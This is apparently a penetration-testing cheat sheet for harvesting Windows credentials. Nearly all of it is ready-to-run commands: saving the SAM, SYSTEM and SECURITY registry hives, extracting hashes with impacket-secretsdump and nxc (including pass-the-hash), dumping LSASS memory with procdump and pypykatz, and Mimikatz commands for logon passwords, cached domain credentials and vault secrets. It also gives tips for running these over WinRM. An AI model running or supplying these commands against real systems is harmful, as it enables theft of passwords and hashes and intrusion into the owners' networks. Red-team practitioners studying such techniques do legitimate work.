# Windows credential access

Needs local admin/SYSTEM, backup or debug rights. Domain DB / replication → [ad/credential-access](../ad/credential-access.md).

## Local SAM and LSA
SAM + SYSTEM; add SECURITY for LSA secrets and cached domain creds.

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```
```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
nxc smb <IP> -u <USER> -p '<PW>' --sam --lsa
impacket-secretsdump -hashes :<NT> '<DOMAIN.TLD>/<USER>@<IP>'
```
- Live hive copy with `copy` fails (in use): use `reg save`.
- SAM = local NT hashes (crackable / Pass the Hash). LSA secrets = service/machine secrets. Cached domain creds (DCC2) = crack only → [ntlm](ntlm.md).

## LSASS
Debug/SYSTEM → dump, parse offline:
```cmd
procdump -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```
```bash
pypykatz lsa minidump lsass.dmp
```

Mimikatz, interactive:
```text
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
lsadump::sam
lsadump::cache
vault::cred
```

Mimikatz, non-interactive (WinRM):
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
- Always end with `"exit"` or the shell hangs waiting for a prompt.
- `token::elevate` needs a usable token. Empty LSASS output ≠ no creds (LSA protection / Credential Guard).
- WDigest plaintext is off by default on modern Windows.
